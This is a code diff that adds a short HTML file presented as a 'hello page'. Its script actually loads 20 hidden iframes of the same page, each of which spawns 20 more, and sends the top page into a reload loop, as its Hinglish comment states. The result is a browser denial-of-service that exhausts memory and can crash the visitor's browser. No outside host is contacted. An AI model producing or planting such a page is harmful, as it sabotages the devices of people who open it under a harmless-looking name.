@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>hello page</title>
+</head>
+
+<body>
+
+<script>
+  const target = location.href.split("?")[0];
+
+  function createLoop() {
+    const frame = document.createElement("iframe");
+    frame.style.display = "none";
+    frame.src = target;
+    document.body.appendChild(frame);
+  }
+
+  // 20 frames
+  for (let i = 0; i < 20; i++) {
+    createLoop();
+  }
+
+  // Current page ko reload-loop me rakho
+  location.replace(target);
+</script>
+
+</body>
+</html>
